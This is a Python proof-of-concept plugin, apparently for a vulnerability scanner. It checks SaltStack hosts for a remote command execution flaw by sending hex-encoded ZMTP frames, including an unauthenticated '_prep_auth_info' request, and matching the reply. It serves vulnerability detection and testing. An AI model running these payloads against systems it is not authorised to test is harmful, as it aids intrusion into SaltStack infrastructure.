import urllib.parse
import socket
import time
from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req, get_logger
from xing.core import PluginType, SchemeType

class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "SaltStack远程命令执行漏洞"
        self.scheme = [SchemeType.ZMTP]


    def verify(self, target):
        host = self.target_info['host']
        port = self.target_info['port']

        check = b"UserAuthenticationError"
        self.logger.info("verify {}".format(target))
        client = socket.socket()
        client.settimeout(6)
        client.connect((host, port))

        payload_hex = ["ff00000000000000017f"]
        payload_hex.append("03004e554c4c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")
        payload_hex.append("04260552454144590b536f636b65742d5479706500000003524551084964656e74697479000000000100001a82a3656e63a5636c656172a46c6f616481a3636d64a470696e67")
        payload_hex.append("0100002582a3656e63a5636c656172a46c6f616481a3636d64af5f707265705f617574685f696e666f")

        data = b""
        counter = 0
        for x in payload_hex:
            payload =  bytes.fromhex(x)
            client.send(payload)
            time.sleep(0.2)
            recv = client.recv(1024)
            if recv:
                counter += 1
                self.logger.info("recv >>> {}".format(recv))
                data += recv
            else:
                break

        client.close()

        if check in  data and len(payload_hex) == counter:
            self.logger.success("found vul {}".format(target))
            return target
            